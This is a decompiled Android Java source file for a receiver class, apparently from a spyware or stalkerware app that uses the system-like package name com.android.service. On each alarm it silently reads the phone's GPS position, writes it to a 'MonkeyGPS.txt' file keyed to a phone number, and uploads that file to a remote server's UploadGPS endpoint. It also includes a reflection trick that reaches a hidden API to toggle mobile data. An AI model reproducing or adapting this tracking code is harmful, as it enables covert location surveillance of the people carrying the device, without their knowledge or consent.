package com.android.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import com.android.service.view.GPSTracker;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.ValueUtiles;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class AlarmReceiver extends BroadcastReceiver {
    private AppPreferences _appPrefs;
    public String baiduLat;
    public String baiduLon;
    private Context cxt = null;
    GPSTracker gpsObj = null;
    private String hostname = "";
    /* access modifiers changed from: private */
    public double latitude = 0.0d;
    /* access modifiers changed from: private */
    public double longitude = 0.0d;
    private String roleString = "";
    /* access modifiers changed from: private */
    public String strDataPath = "";
    public String strLatObj;
    public String strLocation;
    public String strLonObj;
    /* access modifiers changed from: private */
    public String strSelect_Mainnum = "";

    public void onReceive(Context context, Intent intent) {
        this.hostname = context.getString(R.string.hostname);
        this._appPrefs = new AppPreferences(context);
        this.cxt = context;
        this.roleString = this._appPrefs.getBody();
        this.strSelect_Mainnum = this._appPrefs.getMainnum();
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(context);
        }
        Log.i("＝＝＝AlarmReceiver＝＝＝", "＝＝＝Got GPS＝＝＝");
        if (haveInternet()) {
            GPS_saveFile();
            ValueUtiles.UploadFileForServer(this.strDataPath + this.strSelect_Mainnum + "MonkeyGPS.txt", "http://" + this.hostname + "/API/UploadGPS.ashx?phonenum=" + this.strSelect_Mainnum);
        }
    }

    private void GPS_saveFile() {
        if (this.gpsObj == null) {
            this.gpsObj = new GPSTracker(this.cxt);
        }
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this.cxt);
        }
        new Thread() {
            public void run() {
                new Thread() {
                    public void run() {
                        if (AlarmReceiver.this.haveInternet() && AlarmReceiver.this.gpsObj != null && AlarmReceiver.this.gpsObj.canGetLocation()) {
                            try {
                                AnonymousClass1.sleep(2000);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            try {
                                AlarmReceiver.this.longitude = AlarmReceiver.this.gpsObj.getLongitude();
                                AlarmReceiver.this.latitude = AlarmReceiver.this.gpsObj.getLatitude();
                                AlarmReceiver.this.strLonObj = Double.toString(AlarmReceiver.this.longitude);
                                AlarmReceiver.this.strLatObj = Double.toString(AlarmReceiver.this.latitude);
                                if (!(AlarmReceiver.this.strLatObj == null || AlarmReceiver.this.strLatObj.length() <= 0 || AlarmReceiver.this.strLonObj == null || AlarmReceiver.this.strLonObj.length() <= 0 || AlarmReceiver.this.strLonObj.equalsIgnoreCase("") || AlarmReceiver.this.strLatObj.equalsIgnoreCase(""))) {
                                    if (AlarmReceiver.this.strLatObj.length() <= 9 || AlarmReceiver.this.strLonObj.length() <= 9) {
                                        AlarmReceiver.this.strLocation = new StringBuilder(String.valueOf(AlarmReceiver.this.strLonObj)).append(XmppService.strCheckTag).append(AlarmReceiver.this.strLatObj).append(XmppService.strCheckTag).append(AlarmReceiver.this.strLonObj).append(XmppService.strCheckTag).append(AlarmReceiver.this.strLatObj).toString();
                                    } else {
                                        AlarmReceiver.this.strLocation = new StringBuilder(String.valueOf(AlarmReceiver.this.strLonObj.substring(0, 9))).append(XmppService.strCheckTag).append(AlarmReceiver.this.strLatObj.substring(0, 9)).append(XmppService.strCheckTag).append(AlarmReceiver.this.strLonObj.substring(0, 9)).append(XmppService.strCheckTag).append(AlarmReceiver.this.strLatObj.substring(0, 9)).toString();
                                    }
                                }
                                System.out.println("-----googleLat---------" + AlarmReceiver.this.strLatObj);
                                System.out.println("-----googleLon---------" + AlarmReceiver.this.strLonObj);
                                FileWriter fw = new FileWriter(new StringBuilder(String.valueOf(AlarmReceiver.this.strDataPath)).append(AlarmReceiver.this.strSelect_Mainnum).append("MonkeyGPS.txt").toString());
                                fw.append(AlarmReceiver.this.strLocation);
                                fw.close();
                            } catch (Exception e2) {
                                e2.printStackTrace();
                            }
                        }
                    }
                }.start();
            }
        }.start();
    }

    private void toggleMobileData(Context context, boolean enabled) {
        ConnectivityManager conMgr = (ConnectivityManager) context.getSystemService("connectivity");
        try {
            Field iConMgrField = Class.forName(conMgr.getClass().getName()).getDeclaredField("mService");
            iConMgrField.setAccessible(true);
            Object iConMgr = iConMgrField.get(conMgr);
            Method setMobileDataEnabledMethod = Class.forName(iConMgr.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", new Class[]{Boolean.TYPE});
            setMobileDataEnabledMethod.setAccessible(true);
            setMobileDataEnabledMethod.invoke(iConMgr, new Object[]{Boolean.valueOf(enabled)});
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e2) {
            e2.printStackTrace();
        } catch (SecurityException e3) {
            e3.printStackTrace();
        } catch (NoSuchMethodException e4) {
            e4.printStackTrace();
        } catch (IllegalArgumentException e5) {
            e5.printStackTrace();
        } catch (IllegalAccessException e6) {
            e6.printStackTrace();
        } catch (InvocationTargetException e7) {
            e7.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public boolean haveInternet() {
        NetworkInfo info = ((ConnectivityManager) this.cxt.getSystemService("connectivity")).getActiveNetworkInfo();
        if (info == null) {
            return false;
        }
        if (info.isConnected()) {
            return true;
        }
        return false;
    }
}
